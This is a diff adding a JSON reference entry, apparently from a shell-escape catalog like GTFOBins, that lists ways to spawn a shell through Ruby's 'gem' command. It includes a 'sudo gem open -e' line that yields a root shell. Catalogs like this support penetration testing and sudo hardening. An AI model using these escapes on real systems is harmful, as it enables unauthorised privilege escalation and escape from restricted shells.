@@ -1,0 +1,28 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "This requires the name of an installed gem to be provided ('rdoc' is usually installed).",
+        "code": "gem open -e \"/bin/sh -c /bin/sh\" rdoc"
+      },
+      {
+        "description": "This invokes the default editor, which is likely to be 'vi', other functions may apply. This requires the name of an installed gem to be provided ('rdoc' is usually installed).",
+        "code": "gem open rdoc\n:!/bin/sh\n"
+      },
+      {
+        "description": "This executes the specified file as 'ruby' code.",
+        "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x\n"
+      },
+      {
+        "description": "This executes the specified file as 'ruby' code.",
+        "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "This requires the name of an installed gem to be provided ('rdoc' is usually installed).",
+        "code": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
+      }
+    ]
+  }
+}
